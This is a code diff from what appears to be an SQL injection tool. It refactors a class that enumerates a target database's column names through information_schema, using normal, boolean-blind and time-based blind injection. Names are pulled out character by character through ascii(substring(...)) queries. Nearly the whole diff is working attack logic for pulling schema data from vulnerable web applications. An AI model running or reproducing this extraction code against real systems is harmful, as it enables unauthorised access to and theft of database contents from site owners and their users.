@@ -36,316 +36,158 @@ class SqliColumns(SqliTables):
                 # 开始跑columns_name
                 logger.debug("Start sqli databases %s's tables %s's columns..." % (database_name, table_name))
 
-                # 先GET
-                if self.sqlirequest == "GET":
-                    logger.debug("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)
+                logger.debug("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)
 
-                    if self.sqlimethod == "normal":
+                if self.sqlimethod == "normal":
 
-                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.debug("Start table's %s column amount sqli..." % table_name)
+                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                    logger.debug("Start table's %s column amount sqli..." % table_name)
 
-                        # 先注columns的数量
+                    # 先注columns的数量
 
-                        columns_number = normal_injection(select='COUNT(*)',
-                                                          source="information_schema.columns",
-                                                          conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                          dealpayload=self.dealpayload,
-                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
-                                                          )
+                    columns_number = normal_injection(select='COUNT(*)',
+                                                      source="information_schema.columns",
+                                                      conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                      dealpayload=self.dealpayload,
+                                                      data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                                      )
 
-                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        logger.info("[*] columns_number: %d" % columns_number)
+                    logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                    logger.info("[*] columns_number: %d" % columns_number)
 
-                        # 每个循环跑一次columns的数据
-                        for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):
-                            # 首先是column name的长度
-                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                    # 每个循环跑一次columns的数据
+                    for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):
+                        # 首先是column name的长度
+                        logger.debug("Start %dth column length sqli..." % (i + 1))
 
-                            column_name_len = normal_injection(select='length(column_name)',
-                                                               source="information_schema.columns",
-                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                               limit=i,
-                                                               dealpayload=self.dealpayload,
-                                                               data=self.Data, isCount=True, sqlirequest=self.sqlirequest
-                                                               )
-
-                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
-
-                            # 然后注columns name
-
-                            column_name = normal_injection(select='column_name',
-                                                           source='information_schema.columns',
+                        column_name_len = normal_injection(select='length(column_name)',
+                                                           source="information_schema.columns",
                                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                            limit=i,
                                                            dealpayload=self.dealpayload,
-                                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                           data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                            )
 
-                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+                        logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                        logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
-                            # 把columns_name插入列表
-                            columns_name.append(column_name)
-                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
+                        # 然后注columns name
 
-                    elif self.sqlimethod == "build":
+                        column_name = normal_injection(select='column_name',
+                                                       source='information_schema.columns',
+                                                       conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                                       limit=i,
+                                                       dealpayload=self.dealpayload,
+                                                       data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                                       )
 
-                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.debug("Start table's %s column amount sqli..." % table_name)
+                        logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
-                        retVal = build_injection(select="COUNT(column_name)",
+                        # 把columns_name插入列表
+                        columns_name.append(column_name)
+                        logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
+
+                elif self.sqlimethod == "build":
+
+                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                    logger.debug("Start table's %s column amount sqli..." % table_name)
+
+                    retVal = build_injection(select="COUNT(column_name)",
+                                             source="information_schema.columns",
+                                             conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isCount=True, sqlirequest=self.sqlirequest)
+                    columns_number = int(retVal)
+
+                    logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                    logger.info("[*] columns_number: %d" % columns_number)
+
+                    for i in range(0, int(columns_number)):
+                        # 然后注 columns_number 的 length
+                        logger.debug("Start %dth column length sqli..." % (i + 1))
+
+                        retVal = build_injection(select="length(column_name)",
                                                  source="information_schema.columns",
                                                  conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                                 limit=i,
+                                                 dealpayload=self.dealpayload, data=self.Data,
+                                                 lens=self.len,
                                                  isCount=True, sqlirequest=self.sqlirequest)
-                        columns_number = int(retVal)
+                        column_name_len = int(retVal)
 
-                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        logger.info("[*] columns_number: %d" % columns_number)
+                        logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                        logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
-                        for i in range(0, int(columns_number)):
-                            # 然后注 columns_number 的 length
-                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                        # 然后注column名字
+                        # 清空column_name
+                        column_name = ""
+                        logger.debug("Start %dth column sqli..." % (i + 1))
 
-                            retVal = build_injection(select="length(column_name)",
+                        for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
+                            retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
                                                      source="information_schema.columns",
                                                      conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                      limit=i,
-                                                     dealpayload=self.dealpayload, data=self.Data,
-                                                     lens=self.len,
-                                                     isCount=True, sqlirequest=self.sqlirequest)
-                            column_name_len = int(retVal)
+                                                     dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                                     isStrings=True, sqlirequest=self.sqlirequest)
+                            column_name += chr(retVal)
 
-                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
+                        logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
-                            # 然后注column名字
-                            # 清空column_name
-                            column_name = ""
-                            logger.debug("Start %dth column sqli..." % (i + 1))
+                        # 把columns_name插入列表
+                        columns_name.append(column_name)
+                        logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
-                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                                retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
-                                                         source="information_schema.columns",
-                                                         conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                         limit=i,
-                                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                                         isStrings=True, sqlirequest=self.sqlirequest)
-                                column_name += chr(retVal)
+                elif self.sqlimethod == "time":
 
-                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+                    logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                    logger.debug("Start table's %s column amount sqli..." % table_name)
 
-                            # 把columns_name插入列表
-                            columns_name.append(column_name)
-                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
+                    retVal = time_injection(select="COUNT(column_name)",
+                                            source="information_schema.columns",
+                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isCount=True, sqlirequest=self.sqlirequest)
+                    columns_number = int(retVal)
 
-                    elif self.sqlimethod == "time":
+                    logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                    logger.info("[*] columns_number: %d" % columns_number)
 
-                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.debug("Start table's %s column amount sqli..." % table_name)
+                    for i in range(0, int(columns_number)):
+                        # 然后注 columns_number 的 length
+                        logger.debug("Start %dth column length sqli..." % (i + 1))
 
-                        retVal = time_injection(select="COUNT(column_name)",
+                        retVal = time_injection(select="length(column_name)",
                                                 source="information_schema.columns",
                                                 conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                limit=i,
+                                                dealpayload=self.dealpayload, data=self.Data,
+                                                times=self.time,
                                                 isCount=True, sqlirequest=self.sqlirequest)
-                        columns_number = int(retVal)
+                        column_name_len = int(retVal)
 
-                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        logger.info("[*] columns_number: %d" % columns_number)
+                        logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                        logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
-                        for i in range(0, int(columns_number)):
-                            # 然后注 columns_number 的 length
-                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                        # 然后注columns名字
+                        # 清空column_name
+                        column_name = ""
+                        logger.debug("Start %dth column sqli..." % (i + 1))
 
-                            retVal = time_injection(select="length(column_name)",
+                        for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
+                            retVal = time_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
                                                     source="information_schema.columns",
                                                     conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                     limit=i,
-                                                    dealpayload=self.dealpayload, data=self.Data,
-                                                    times=self.time,
-                                                    isCount=True, sqlirequest=self.sqlirequest)
-                            column_name_len = int(retVal)
+                                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                    isStrings=True, sqlirequest=self.sqlirequest)
+                            column_name += chr(retVal)
 
-                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
+                        logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
-                            # 然后注columns名字
-                            # 清空column_name
-                            column_name = ""
-                            logger.debug("Start %dth column sqli..." % (i + 1))
-
-                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                                retVal = time_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
-                                                        source="information_schema.columns",
-                                                        conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                        limit=i,
-                                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                                        isStrings=True, sqlirequest=self.sqlirequest)
-                                column_name += chr(retVal)
-
-                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
-
-                            # 把columns_name插入列表
-                            columns_name.append(column_name)
-                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
-
-                # 然后是post
-                elif self.sqlirequest == "POST":
-                    logger.debug("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)
-
-                    if self.sqlimethod == "normal":
-
-                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.debug("Start table's %s column amount sqli..." % table_name)
-
-                        # 先注columns的数量
-
-                        columns_number = normal_injection(select='COUNT(*)',
-                                                          source="information_schema.columns",
-                                                          conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                          dealpayload=self.dealpayload,
-                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
-                                                          )
-
-                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        logger.info("[*] columns_number: %d" % columns_number)
-
-                        # 每个循环跑一次columns的数据
-                        for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):
-
-                            # 首先是column name的长度
-                            logger.debug("Start %dth column length sqli..." % (i + 1))
-
-                            column_name_len = normal_injection(select='length(column_name)',
-                                                               source="information_schema.columns",
-                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                               limit=i,
-                                                               dealpayload=self.dealpayload,
-                                                               data=self.Data, isCount=True,
-                                                               sqlirequest=self.sqlirequest
-                                                               )
-
-                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
-
-                            # 然后注columns_name
-
-                            column_name = normal_injection(select='column_name',
-                                                           source='information_schema.columns',
-                                                           conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                           limit=i,
-                                                           dealpayload=self.dealpayload,
-                                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
-                                                           )
-
-                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
-
-                            # 把columns_name插入列表
-                            columns_name.append(column_name)
-                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
-
-                    elif self.sqlimethod == "build":
-
-                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.debug("Start table's %s column amount sqli..." % table_name)
-
-                        retVal = build_injection(select="COUNT(column_name)",
-                                                 source="information_schema.columns",
-                                                 conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                                 isCount=True, sqlirequest=self.sqlirequest)
-                        columns_number = int(retVal)
-
-                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        logger.info("[*] columns_number: %d" % columns_number)
-
-                        for i in range(0, int(columns_number)):
-                            # 然后注 columns_number 的 length
-                            logger.debug("Start %dth column length sqli..." % (i + 1))
-
-                            retVal = build_injection(select="length(column_name)",
-                                                     source="information_schema.columns",
-                                                     conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                     limit=i,
-                                                     dealpayload=self.dealpayload, data=self.Data,
-                                                     lens=self.len,
-                                                     isCount=True, sqlirequest=self.sqlirequest)
-                            column_name_len = int(retVal)
-
-                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
-
-                            # 然后注columns名字
-                            # 清空column_name
-                            column_name = ""
-                            logger.debug("Start %dth column sqli..." % (i + 1))
-                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                                retVal = build_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
-                                                         source="information_schema.columns",
-                                                         conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                         limit=i,
-                                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                                         isStrings=True, sqlirequest=self.sqlirequest)
-                                column_name += chr(retVal)
-
-                            logger.debug(
-                                "%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
-
-                            # 把columns_name插入列表
-                            columns_name.append(column_name)
-                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
-
-                    elif self.sqlimethod == "time":
-
-                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.debug("Start table's %s column amount sqli..." % table_name)
-
-                        retVal = time_injection(select="COUNT(column_name)",
-                                                source="information_schema.columns",
-                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                                isCount=True, sqlirequest=self.sqlirequest)
-                        columns_number = int(retVal)
-
-                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        logger.info("[*] columns_number: %d" % columns_number)
-
-                        for i in range(0, int(columns_number)):
-                            # 然后注 columns_number 的 length
-                            logger.debug("Start %dth column length sqli..." % (i + 1))
-                            retVal = time_injection(select="length(column_name)",
-                                                    source="information_schema.columns",
-                                                    conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                    limit=i,
-                                                    dealpayload=self.dealpayload, data=self.Data,
-                                                    times=self.time,
-                                                    isCount=True, sqlirequest=self.sqlirequest)
-                            column_name_len = int(retVal)
-
-                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
-
-                            # 然后注columns名字
-                            # 清空column_name
-                            column_name = ""
-                            logger.debug("Start %dth column sqli..." % (i + 1))
-
-                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
-                                retVal = time_injection(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
-                                                        source="information_schema.columns",
-                                                        conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
-                                                        limit=i,
-                                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                                        isStrings=True, sqlirequest=self.sqlirequest)
-                                column_name += chr(retVal)
-
-                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
-
-                            # 把columns_name插入列表
-                            columns_name.append(column_name)
-                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
+                        # 把columns_name插入列表
+                        columns_name.append(column_name)
+                        logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                 # 把注入得到的columns_name列表转为元组
                 self.columns_name[database_name][table_name] = tuple(columns_name)
